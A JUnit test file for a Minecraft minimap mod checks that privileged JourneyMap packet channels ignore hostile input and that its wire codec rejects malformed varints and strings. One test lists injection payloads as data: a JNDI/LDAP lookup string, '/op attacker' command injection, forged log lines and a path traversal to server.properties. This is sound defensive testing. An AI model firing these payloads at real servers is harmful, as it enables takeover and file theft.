package ao1roh.dev.nahnominimap.common;

import ao1roh.dev.nahnominimap.common.api.ClientSession;
import ao1roh.dev.nahnominimap.common.jm.JourneyMapProtocol;
import ao1roh.dev.nahnominimap.common.network.WireCodec;
import com.google.common.io.ByteStreams;
import org.junit.Test;
import java.lang.reflect.Proxy;
import java.util.Random;
import java.nio.charset.StandardCharsets;
import static org.junit.Assert.assertEquals;

public class PacketSafetyTest {
    @Test public void privilegedJourneyRequestsCannotInvokePlayerOrServerActions() {
        ClientSession player = (ClientSession) Proxy.newProxyInstance(ClientSession.class.getClassLoader(),
                new Class<?>[]{ClientSession.class}, (proxy, method, args) -> {
                    throw new AssertionError("Unexpected player action: " + method.getName());
                });
        JourneyMapProtocol handler = new JourneyMapProtocol(null);
        for (String channel : new String[]{"journeymap:admin_req", "journeymap:admin_save", "journeymap:teleport_req"}) {
            handler.onPluginMessage(channel, player, new byte[0]);
        }
        for (byte type : new byte[]{0, 1, 4}) {
            handler.onPluginMessage("journeymap:common", player, new byte[]{type});
        }
    }

    @Test public void networkStringsRoundTripAsUtf8() {
        String expected = "Привет, 世界";
        com.google.common.io.ByteArrayDataOutput output = ByteStreams.newDataOutput();
        WireCodec.writeUtf(expected, output);
        assertEquals(expected, WireCodec.readUtf(ByteStreams.newDataInput(output.toByteArray())));
    }

    @Test(expected = RuntimeException.class) public void oversizedVarintIsRejected() {
        WireCodec.readVarInt(ByteStreams.newDataInput(new byte[]{-1, -1, -1, -1, -1, -1}));
    }

    @Test(expected = IllegalArgumentException.class) public void overflowingFifthVarintByteIsRejected() {
        WireCodec.readVarInt(ByteStreams.newDataInput(new byte[]{-128, -128, -128, -128, 16}));
    }

    @Test public void negativeVarintRoundTrips() {
        com.google.common.io.ByteArrayDataOutput output = ByteStreams.newDataOutput();
        WireCodec.writeVarInt(-1, output);
        assertEquals(-1, WireCodec.readVarInt(ByteStreams.newDataInput(output.toByteArray())));
    }

    @Test public void varintBoundariesRoundTrip() {
        for (int value : new int[]{0, 1, 127, 128, 16383, 16384, Integer.MAX_VALUE, Integer.MIN_VALUE, -1}) {
            com.google.common.io.ByteArrayDataOutput output = ByteStreams.newDataOutput();
            WireCodec.writeVarInt(value, output);
            assertEquals(value, WireCodec.readVarInt(ByteStreams.newDataInput(output.toByteArray())));
        }
    }

    @Test(expected = IllegalArgumentException.class) public void malformedUtf8IsRejected() {
        WireCodec.readUtf(ByteStreams.newDataInput(new byte[]{2, (byte) 0xc3, 0x28}));
    }

    @Test public void randomizedPrivilegedPacketsCannotCallPlayer() {
        ClientSession player = (ClientSession) Proxy.newProxyInstance(ClientSession.class.getClassLoader(),
                new Class<?>[]{ClientSession.class}, (proxy, method, args) -> {
                    throw new AssertionError("Unexpected player action: " + method.getName());
                });
        JourneyMapProtocol handler = new JourneyMapProtocol(null);
        Random random = new Random(139);
        for (int i = 0; i < 100_000; i++) {
            byte[] data = new byte[random.nextInt(257) + 1];
            random.nextBytes(data);
            data[0] = new byte[]{0, 1, 4}[i % 3];
            handler.onPluginMessage("journeymap:common", player, data);
        }
    }

    @Test public void commandAndFormattingInjectionInPrivilegedPacketsHasNoEffect() {
        ClientSession player = (ClientSession) Proxy.newProxyInstance(ClientSession.class.getClassLoader(),
                new Class<?>[]{ClientSession.class}, (proxy, method, args) -> {
                    throw new AssertionError("Unexpected action: " + method.getName());
                });
        JourneyMapProtocol handler = new JourneyMapProtocol(null);
        for (String payload : new String[]{"/op attacker", "\n[INFO] forged entry", "${jndi:ldap://example.invalid/a}",
                "<click:run_command:'/op attacker'>x</click>", "../../server.properties", "\u0000\r\n"}) {
            byte[] bytes = payload.getBytes(StandardCharsets.UTF_8);
            for (String channel : new String[]{"journeymap:admin_req", "journeymap:admin_save", "journeymap:teleport_req"}) {
                handler.onPluginMessage(channel, player, bytes);
            }
        }
    }

    @Test public void randomizedStringDecodingIsBounded() {
        Random random = new Random(140);
        for (int i = 0; i < 20_000; i++) {
            byte[] data = new byte[random.nextInt(129)];
            random.nextBytes(data);
            try { WireCodec.readUtf(ByteStreams.newDataInput(data)); }
            catch (RuntimeException rejected) { /* malformed strings are expected */ }
        }
    }
}
